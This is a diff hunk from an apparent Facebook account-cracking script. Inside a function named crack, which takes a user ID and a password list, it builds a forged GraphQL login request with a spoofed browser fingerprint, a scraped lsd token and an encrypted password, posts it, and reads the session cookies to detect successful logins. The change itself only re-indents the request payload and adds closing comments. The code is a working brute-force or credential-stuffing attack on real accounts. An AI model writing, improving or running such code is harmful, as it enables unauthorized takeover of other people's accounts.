@@ -189,47 +189,48 @@ def crack(uid, password_list, total_count):
             "caa_login_request_extra_info": {
                 "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK",
                 "shared_prefs_data": "eyIzMDAwMCI6W3sidCI6MTc3NjgzMjE2MC4yMzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc3NjgzMjE2MC4yMzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjowfV0sIjMwMDAyIjpbeyJ0IjoxNzc2ODMyMTYwLjIzNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjB9XSwiMzAwMDMiOlt7InQiOjE3NzY4MzIxNjAuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6WyJlbi1JTiIsImVuLUdCIiwiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzc2ODMyMTYwLjIzNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjMwMH1dLCIzMDAwNSI6W3sidCI6MTc3NjgzMjE2MC4yNTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp7InciOjk4MCwiaCI6MTc5NX19XSwiMzAwMDciOlt7InQiOjE3NzY4MzIxNjAuMjU2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzc2ODMyMTYwLjI5MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzc2ODMyMTYwLjI1OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOiJHb29nbGUgSW5jLiJXSwiMzAwMTMiOlt7InQiOjE3NzY4MzIxNjAuMjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjoiNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc3NjgzMjE2MC4yNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOiJMaW51eCBhcm12OGwifV0sIjMwMDE4IjpbeyJ0IjoxNzc2ODMyMTYwLjI2MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjh9XSwiMzAwMjIiOlt7InQiOjE3NzY4MzIxNjAuMjcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzc2ODMyMTYwLjI3MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NzY4MzIxNjAuMjcxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6NX1dLCIzMDA5NCI6W3sidCI6MTc3NjgzMjE2MC4yNzIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjoiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTAzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzc2ODMyMTYwLjI3MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjN9XSwiMzAxMDYiOlt7InQiOjE3NzY4MzIxNTkuODM0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6ZmFsc2V9LHsidCI6MTc3NjgzMjE2MC4zODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzc2ODMyMTU5LjgzNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOmZhbHNlfSx7InQiOjE3NzY4MzIxNjAuMzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp0cnVlfV19",
-            "cuid": "",
-            "guid": "f424dbe4a82b4d0cf",
-            "jazoest": "22301",
-            "lgndim": "eyJ3IjozOTMsImgiOjg1MSwiYXciOjM5MywiYWgiOjg1MSwiYyI6MjR9",
-            "lgnjs": "1776832160",
-            "lgnrnd": "212918_0AZj",
-            "locale": "bn_IN",
-            "login_source": "comet_headerless_login",
-            "lsd":  re.search('name="lsd" value="(.*?)"',str(response2.text)).group(1),
-            "next": "",
-            "prefill_contact_point": "",
-            "prefill_source": "",
-            "prefill_type": "",
-            "skstamp": "",
-            "timezone": "-330"
-        },
-        "credential_type": "password",
-        "dyi_job_id": "",
-        "enc_password": {
-            "sensitive_string_value": enc_password
-        },
-        "event_request_id": "bed64a47-935d-496c-8155-0df3a01eec31",
-        "identifier": uid,
-        "ig_web_device_id": None,
-        "initial_request_id": "1",
-        "lids": None,
-        "login_source": "LOGIN",
-        "next": None,
-        "passkey_payload": None,
-        "password": {
-            "sensitive_string_value": enc_password
-        },
-        "persistent": True,
-        "query_params": "{}",
-        "trusted_device_records": "{}",
-        "use_uid_to_login": False,
-        "waterfall_id": "ad8438a3-c020-4019-97f2-ec5687242d8e"
-    }),
+                "cuid": "",
+                "guid": "f424dbe4a82b4d0cf",
+                "jazoest": "22301",
+                "lgndim": "eyJ3IjozOTMsImgiOjg1MSwiYXciOjM5MywiYWgiOjg1MSwiYyI6MjR9",
+                "lgnjs": "1776832160",
+                "lgnrnd": "212918_0AZj",
+                "locale": "bn_IN",
+                "login_source": "comet_headerless_login",
+                "lsd": re.search('name="lsd" value="(.*?)"', str(response2.text)).group(1),
+                "next": "",
+                "prefill_contact_point": "",
+                "prefill_source": "",
+                "prefill_type": "",
+                "skstamp": "",
+                "timezone": "-330"
+            },
+            "credential_type": "password",
+            "dyi_job_id": "",
+            "enc_password": {
+                "sensitive_string_value": enc_password
+            },
+            "event_request_id": "bed64a47-935d-496c-8155-0df3a01eec31",
+            "identifier": uid,
+            "ig_web_device_id": None,
+            "initial_request_id": "1",
+            "lids": None,
+            "login_source": "LOGIN",
+            "next": None,
+            "passkey_payload": None,
+            "password": {
+                "sensitive_string_value": enc_password
+            },
+            "persistent": True,
+            "query_params": "{}",
+            "trusted_device_records": "{}",
+            "use_uid_to_login": False,
+            "waterfall_id": "ad8438a3-c020-4019-97f2-ec5687242d8e"
+        }
+    }),  # This closes json.dumps()
     'doc_id': '9807605492696448',
     'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
-}
+} # This closes the main data dictionary
             # Make API request
             response = session.post('https://www.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data)
             log_cookies = session.cookies.get_dict().keys()
